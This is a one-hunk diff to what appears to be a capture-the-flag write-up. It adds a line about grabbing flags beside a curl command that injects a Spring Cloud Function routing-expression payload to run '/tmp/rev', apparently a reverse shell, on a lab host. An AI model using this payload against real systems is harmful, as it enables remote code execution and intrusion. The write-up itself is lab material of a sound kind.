@@ -380,7 +380,7 @@ Then I executed this file to spring a shell locally.
 ```sh
 curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /tmp/rev")' --data-raw 'data' -v 
 ```
-
+Once you have access, just grab the flags!
 
 ### Flags
 
